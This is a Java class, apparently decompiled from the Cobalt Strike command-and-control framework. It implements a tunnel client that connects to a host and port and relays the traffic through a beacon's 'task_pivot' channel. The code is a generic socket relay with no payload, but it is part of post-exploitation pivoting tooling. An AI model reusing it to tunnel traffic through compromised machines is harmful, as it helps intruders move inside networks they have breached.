package tunnel;

import aggressor.AggressorClient;
import common.AObject;
import common.CommonUtils;
import common.MudgeSanity;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.LinkedList;
import socks.BeaconProxyListener;

public class TunnelClient extends AObject {
   protected BeaconProxyListener messages;
   protected TunnelClient._B reader = null;
   protected TunnelClient._A writer = null;
   protected InputStream in = null;
   protected OutputStream out = null;
   protected Socket socket = null;
   protected AggressorClient client;
   protected int chid;
   protected String bid;
   protected boolean alive = false;

   public TunnelClient(AggressorClient var1, String var2, int var3) {
      this.bid = var2;
      this.chid = var3;
      this.client = var1;
      this.messages = new BeaconProxyListener();
   }

   public boolean isAlive() {
      synchronized(this) {
         return this.alive && this.socket.isConnected();
      }
   }

   public void die() {
      synchronized(this) {
         if (!this.alive) {
            return;
         }

         this.alive = false;

         try {
            if (this.in != null) {
               this.in.close();
            }

            if (this.out != null) {
               this.out.close();
            }

            if (this.socket != null) {
               this.socket.close();
            }

            this.in = null;
            this.out = null;
            this.socket = null;
         } catch (IOException var5) {
            MudgeSanity.logException("TunnelClient die() [socket]", var5, false);
         }
      }

      try {
         byte[] var1 = this.messages.closeMessage(this.chid);
         this.client.getConnection().call("beacons.task_pivot", CommonUtils.args(this.bid, var1));
      } catch (IOException var4) {
         MudgeSanity.logException("TunnelClient die() [message]", var4, false);
      }

   }

   public void start(String var1, int var2) {
      this.writer = new TunnelClient._A(var1, var2);
      (new Thread(this.writer, "Tunnel Client Writer " + var1 + ":" + var2)).start();
   }

   public boolean isTarget(TunnelMessage var1) {
      return this.chid == var1.getSocketID() && this.bid.equals(var1.getBeaconID());
   }

   public void write(byte[] var1) {
      this.writer.A(var1);
   }

   public void fireRead(byte[] var1, int var2) {
      try {
         byte[] var3 = this.messages.writeMessage(this.chid, var1, var2);
         this.client.getConnection().call("beacons.task_pivot", CommonUtils.args(this.bid, var3));
      } catch (IOException var4) {
         MudgeSanity.logException("TunnelClient fireRead: " + var2, var4, false);
      }

   }

   private class _A implements Runnable {
      protected String B;
      protected int C;
      protected LinkedList D = new LinkedList();

      protected byte[] A() {
         synchronized(this) {
            return (byte[])((byte[])this.D.pollFirst());
         }
      }

      protected void A(byte[] var1) {
         synchronized(this) {
            if (this.D.size() > 1000) {
               CommonUtils.print_error("tunnel for " + this.B + ":" + this.C + " has 1,000 accumulated reads. Probably dead. Closing.");
               TunnelClient.this.die();
            } else {
               this.D.add(var1);
            }
         }
      }

      public _A(String var2, int var3) {
         this.B = var2;
         this.C = var3;
      }

      public void run() {
         try {
            TunnelClient.this.socket = new Socket(this.B, this.C);
            TunnelClient.this.socket.setKeepAlive(true);
            TunnelClient.this.socket.setSoTimeout(0);
            TunnelClient.this.alive = true;
            TunnelClient.this.in = TunnelClient.this.socket.getInputStream();
            TunnelClient.this.out = TunnelClient.this.socket.getOutputStream();
            TunnelClient.this.reader = TunnelClient.this.new _B();
            (new Thread(TunnelClient.this.reader, "Tunnel Client Reader " + this.B + ":" + this.C)).start();
         } catch (IOException var2) {
            MudgeSanity.logException("Failed to connect to " + this.B + ":" + this.C, var2, false);
            TunnelClient.this.die();
            return;
         }

         try {
            while(TunnelClient.this.isAlive()) {
               byte[] var1 = this.A();
               if (var1 != null) {
                  TunnelClient.this.out.write(var1, 0, var1.length);
                  TunnelClient.this.out.flush();
                  Thread.yield();
               } else {
                  CommonUtils.sleep(25L);
               }
            }
         } catch (IOException var3) {
            TunnelClient.this.die();
         }

      }
   }

   private class _B implements Runnable {
      public _B() {
      }

      public void run() {
         try {
            byte[] var1 = new byte[65536];
            boolean var2 = false;

            while(TunnelClient.this.isAlive()) {
               int var4 = TunnelClient.this.in.read(var1);
               if (var4 == -1) {
                  break;
               }

               TunnelClient.this.fireRead(var1, var4);
               Thread.yield();
            }

            TunnelClient.this.die();
         } catch (IOException var3) {
            TunnelClient.this.die();
         }

      }
   }
}
